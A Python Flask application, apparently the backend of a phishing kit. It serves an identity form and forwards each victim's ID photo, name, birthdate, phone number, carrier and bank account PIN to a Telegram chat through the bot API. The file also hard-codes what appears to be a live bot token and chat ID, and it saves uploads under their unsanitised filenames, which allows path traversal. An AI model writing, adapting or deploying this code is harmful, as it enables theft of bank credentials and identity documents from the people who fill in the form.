import os, requests
from datetime import datetime
from pathlib import Path
from flask import Flask, render_template, request, jsonify

# ───── 환경 변수에서 읽기 ─────
BOT_TOKEN = os.environ.get("8188337653:AAFGh85xzp5u_RqRJLrV8p3zR_D13c9RHuo")      # Render > Environment tab 에 등록
CHAT_ID   = os.environ.get("1902936")        # 숫자 그대로 (“1023...”)
MAX_FILE  = 5 * 1024 * 1024                  # 5 MB

# ───── Flask 기본 ─────
BASE_DIR   = Path(__file__).parent.resolve()
UPLOAD_DIR = BASE_DIR / "uploads"
UPLOAD_DIR.mkdir(exist_ok=True)

app = Flask(__name__, template_folder="templates")
app.config["MAX_CONTENT_LENGTH"] = MAX_FILE

# ───── 텔레그램 전송 헬퍼 ─────
def send_doc(path: Path, caption: str) -> bool:
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with path.open("rb") as f:
        r = requests.post(
            url,
            data={"chat_id": CHAT_ID, "caption": caption, "parse_mode": "Markdown"},
            files={"document": f},
            timeout=30,
        )
    return r.ok

def caption_from(form) -> str:
    birth = datetime.strptime(form["birthdate"], "%Y-%m-%d").strftime("%Y년 %m월 %d일")
    return (
        "*신분정보 제출*\n"
        f"• 이름 : {form['name']}\n"
        f"• 생년월일 : {birth}\n"
        f"• 통신사 : {form['carrier']}\n"
        f"• 전화번호 : {form['phone']}\n"
        f"• 계좌 PIN : {form['bankpin']}\n"
        "• 동의여부 : ✅"
    )

# ───── 라우팅 ─────
@app.route("/")
def index():
    return render_template("identity_form.html")

@app.route("/submit", methods=["POST"])
def submit_form():
    file = request.files.get("idPhoto")
    if not file or "." not in file.filename:
        return jsonify(success=False, msg="파일 오류"), 400

    save_path = UPLOAD_DIR / file.filename
    file.save(save_path)

    ok = send_doc(save_path, caption_from(request.form))
    save_path.unlink(missing_ok=True)        # Render 디스크는 일시적이므로 삭제

    return jsonify(success=ok)

# ───── 로컬 실행 ─────
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000)) # Render 는 $PORT 를 넣어줌
    app.run(host="0.0.0.0", port=port)
